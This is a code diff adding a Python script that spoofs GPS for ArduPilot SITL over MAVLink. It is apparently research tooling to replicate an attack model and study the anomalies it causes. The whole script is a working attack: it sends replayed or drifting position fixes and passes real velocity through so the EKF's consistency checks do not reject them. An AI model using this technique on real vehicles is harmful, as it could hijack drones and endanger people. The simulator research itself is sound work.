@@ -1,4 +1,41 @@
-@dataclass
+"""
+Inject spoofed GPS coordinates into ArduPilot SITL via MAVLink GPS_INPUT messages.
+
+Run after `sim/configure_sitl.py --mode attack` and a SITL reboot (see README REPLAY-01).
+Connects on the secondary MAVProxy UDP port (14551), reads the vehicle's real position
+and velocity from GLOBAL_POSITION_INT, and replaces the position component with a
+spoofed one while passing real velocity through — this keeps the EKF's internal
+consistency checks from immediately rejecting the fix, so the resulting anomalies
+(geofence breach, baro/yaw/mag/HDOP divergence) match the attack model under
+replication (Hakani et al., 2026).
+
+All tunable values live in gps_attack_params.yaml.
+"""
+
+from __future__ import annotations
+
+import logging
+import sys
+import time
+from dataclasses import dataclass
+from pathlib import Path
+
+import yaml
+from pymavlink import mavutil
+
+CONFIG_PATH = Path(__file__).parent / "gps_attack_params.yaml"
+LOG_PATH = Path(__file__).parent.parent / "logs" / "gps_hook.log"
+
+# GPS epoch: 1980-01-06T00:00:00Z. Used to derive time_week/time_week_ms for
+# GPS_INPUT — there is no "ignore time" flag in GPS_INPUT_IGNORE_FLAGS, so a
+# wrong/zero week number reads as a multi-decade time jump to the GPS backend.
+_GPS_EPOCH_UNIX = 315964800
+_SECONDS_PER_WEEK = 7 * 24 * 60 * 60
+
+logger = logging.getLogger(__name__)
+
+
+@dataclass(frozen=True)
 class GpsAttack:
     """Attack targeting GPS / navigation.
 
@@ -17,3 +54,281 @@ class GpsAttack:
     alt: float = 0.0
     rate_lat: float = 1e-5
     rate_lon: float = 1e-5
+
+
+@dataclass(frozen=True)
+class Config:
+    """Immutable runtime configuration loaded from gps_attack_params.yaml."""
+
+    connection_address: str
+    heartbeat_timeout_seconds: int
+    injection_rate_hz: float
+    duration_seconds: float
+    attack: GpsAttack
+
+    @classmethod
+    def from_yaml(cls, path: Path = CONFIG_PATH) -> Config:
+        """Load and validate configuration from a YAML file.
+
+        Args:
+            path: Path to the YAML config file.
+
+        Raises:
+            FileNotFoundError: If the config file does not exist.
+            KeyError: If a required section or key is absent.
+        """
+        with path.open() as file:
+            data = yaml.safe_load(file)
+        return cls(
+            connection_address=data["connection"]["address"],
+            heartbeat_timeout_seconds=data["connection"]["heartbeat_timeout_seconds"],
+            injection_rate_hz=data["injection"]["rate_hz"],
+            duration_seconds=data["injection"]["duration_seconds"],
+            attack=GpsAttack(**data["attack"]),
+        )
+
+
+class SitlConnection:
+    """Manages a MAVLink connection to ArduPilot SITL."""
+
+    def __init__(self, config: Config) -> None:
+        """Initialise with injected configuration; does not connect immediately."""
+        self._config = config
+        self._mav = None
+
+    def connect(self) -> None:
+        """Open the MAVLink connection and block until a heartbeat is received.
+
+        Raises:
+            ConnectionError: If no heartbeat arrives within the configured timeout.
+        """
+        logger.info("Connecting to SITL at %s …", self._config.connection_address)
+        self._mav = mavutil.mavlink_connection(self._config.connection_address)
+        if not self._mav.wait_heartbeat(timeout=self._config.heartbeat_timeout_seconds):
+            raise ConnectionError(
+                f"No heartbeat from SITL within "
+                f"{self._config.heartbeat_timeout_seconds}s. "
+                "Is sim_vehicle.py running?"
+            )
+        logger.info(
+            "  system %d component %d online",
+            self._mav.target_system,
+            self._mav.target_component,
+        )
+
+    def close(self) -> None:
+        """Close the MAVLink connection if one is open."""
+        if self._mav:
+            self._mav.close()
+
+    @property
+    def mav(self):
+        """Return the active MAVLink handle.
+
+        Raises:
+            RuntimeError: If called before connect().
+        """
+        if not self._mav:
+            raise RuntimeError("Call connect() before accessing the MAVLink handle.")
+        return self._mav
+
+
+@dataclass(frozen=True)
+class VehiclePosition:
+    """A position and velocity sample read from GLOBAL_POSITION_INT.
+
+    Velocity is in the NED frame (m/s), matching GPS_INPUT's vn/ve/vd fields.
+    """
+
+    lat: float
+    lon: float
+    alt: float
+    velocity_north: float
+    velocity_east: float
+    velocity_down: float
+
+
+class GpsSpoofer:
+    """Computes and injects spoofed GPS_INPUT messages for a configured attack."""
+
+    _FIX_TYPE_3D = 3
+    _SATELLITES_VISIBLE = 12
+    _HDOP = 1.0
+    _VDOP = 1.0
+    _SPEED_ACCURACY = 0.5
+    _HORIZONTAL_ACCURACY = 1.0
+    _VERTICAL_ACCURACY = 2.0
+
+    def __init__(self, connection: SitlConnection, config: Config) -> None:
+        """Initialise with an active connection and injected configuration."""
+        self._connection = connection
+        self._config = config
+        self._logged_first_position = False
+        self._last_position: VehiclePosition | None = None
+
+    def run(self) -> None:
+        """Inject spoofed GPS_INPUT messages until the configured duration elapses."""
+        attack = self._config.attack
+        interval_seconds = 1.0 / self._config.injection_rate_hz
+        start_time = time.monotonic()
+        elapsed_seconds = 0.0
+
+        logger.info(
+            "Starting '%s' GPS spoof for %.0fs at %.1f Hz",
+            attack.type,
+            self._config.duration_seconds,
+            self._config.injection_rate_hz,
+        )
+        try:
+            while elapsed_seconds < self._config.duration_seconds:
+                elapsed_seconds = time.monotonic() - start_time
+
+                fresh_position = self._read_vehicle_position()
+                if fresh_position is not None:
+                    self._last_position = fresh_position
+
+                position = self._last_position
+                if position is not None:
+                    spoofed_lat, spoofed_lon, spoofed_alt = self._compute_spoofed_position(
+                        position, elapsed_seconds
+                    )
+                    if not self._logged_first_position:
+                        logger.info(
+                            "First reading — real: lat=%.7f lon=%.7f alt=%.2f "
+                            "vn=%.2f ve=%.2f vd=%.2f | spoofed: lat=%.7f lon=%.7f alt=%.2f",
+                            position.lat, position.lon, position.alt,
+                            position.velocity_north, position.velocity_east,
+                            position.velocity_down,
+                            spoofed_lat, spoofed_lon, spoofed_alt,
+                        )
+                        self._logged_first_position = True
+                    self._send_gps_input(position, spoofed_lat, spoofed_lon, spoofed_alt)
+
+                time.sleep(interval_seconds)
+        except KeyboardInterrupt:
+            logger.info("Interrupted — stopping GPS spoof.")
+
+        logger.info("Done — GPS spoof finished after %.0fs.", elapsed_seconds)
+
+    def _read_vehicle_position(self) -> VehiclePosition | None:
+        """Poll for a fresh GLOBAL_POSITION_INT without blocking the injection loop.
+
+        Non-blocking so the GPS_INPUT send cadence stays steady — the run loop
+        falls back to the last-known position when nothing new has arrived,
+        rather than stalling on ArduPilot's GLOBAL_POSITION_INT stream rate.
+
+        Returns:
+            A fresh position sample, or None if none is currently queued.
+        """
+        msg = self._connection.mav.recv_match(type="GLOBAL_POSITION_INT", blocking=False)
+        if msg is None:
+            return None
+        return VehiclePosition(
+            lat=msg.lat / 1e7,
+            lon=msg.lon / 1e7,
+            alt=msg.alt / 1000.0,
+            velocity_north=msg.vx / 100.0,
+            velocity_east=msg.vy / 100.0,
+            velocity_down=msg.vz / 100.0,
+        )
+
+    def _compute_spoofed_position(
+        self, position: VehiclePosition, elapsed_seconds: float
+    ) -> tuple[float, float, float]:
+        """Compute the spoofed (lat, lon, alt) for the configured attack type.
+
+        Args:
+            position: The vehicle's real position — the basis for ``passthrough``
+                and ``drift`` attacks.
+            elapsed_seconds: Time since the spoof started, used by ``drift``.
+
+        Raises:
+            ValueError: If the configured attack type is not recognised.
+        """
+        attack = self._config.attack
+        if attack.type == "passthrough":
+            return position.lat, position.lon, position.alt
+        if attack.type == "replay":
+            return attack.lat, attack.lon, attack.alt
+        if attack.type == "drift":
+            return (
+                position.lat + attack.rate_lat * elapsed_seconds,
+                position.lon + attack.rate_lon * elapsed_seconds,
+                position.alt,
+            )
+        raise ValueError(f"Unknown GPS attack type: {attack.type!r}")
+
+    def _send_gps_input(
+        self,
+        position: VehiclePosition,
+        lat: float,
+        lon: float,
+        alt: float,
+    ) -> None:
+        """Send a single spoofed GPS_INPUT message.
+
+        Real velocity is passed through unchanged — only position is spoofed,
+        so the EKF's internal consistency checks don't immediately reject the fix.
+        """
+        seconds_since_gps_epoch = time.time() - _GPS_EPOCH_UNIX
+        gps_week, seconds_into_week = divmod(seconds_since_gps_epoch, _SECONDS_PER_WEEK)
+
+        self._connection.mav.mav.gps_input_send(
+            int(time.time() * 1e6),         # time_usec
+            0,                              # gps_id
+            0,                              # ignore_flags — every field below is valid
+            int(seconds_into_week * 1000),  # time_week_ms
+            int(gps_week),                  # time_week
+            self._FIX_TYPE_3D,              # fix_type
+            int(lat * 1e7),             # lat, degE7
+            int(lon * 1e7),             # lon, degE7
+            alt,                        # alt, m MSL
+            self._HDOP,
+            self._VDOP,
+            position.velocity_north,
+            position.velocity_east,
+            position.velocity_down,
+            self._SPEED_ACCURACY,
+            self._HORIZONTAL_ACCURACY,
+            self._VERTICAL_ACCURACY,
+            self._SATELLITES_VISIBLE,
+            0,                          # yaw, 0 = unknown
+        )
+
+
+def _configure_logging() -> None:
+    """Send INFO+ to the console and WARNING+ (including exceptions) to logs/."""
+    LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
+
+    console_handler = logging.StreamHandler()
+    console_handler.setLevel(logging.INFO)
+
+    file_handler = logging.FileHandler(LOG_PATH)
+    file_handler.setLevel(logging.WARNING)
+
+    logging.basicConfig(
+        level=logging.INFO,
+        format="%(asctime)s %(levelname)s %(message)s",
+        handlers=[console_handler, file_handler],
+    )
+
+
+def run() -> None:
+    """Load configuration, connect to SITL, and run the GPS spoof."""
+    config = Config.from_yaml()
+
+    connection = SitlConnection(config)
+    connection.connect()
+    try:
+        GpsSpoofer(connection, config).run()
+    finally:
+        connection.close()
+
+
+if __name__ == "__main__":
+    _configure_logging()
+    try:
+        run()
+    except (ConnectionError, FileNotFoundError, KeyError, ValueError) as exc:
+        logger.error("Error: %s", exc)
+        sys.exit(1)
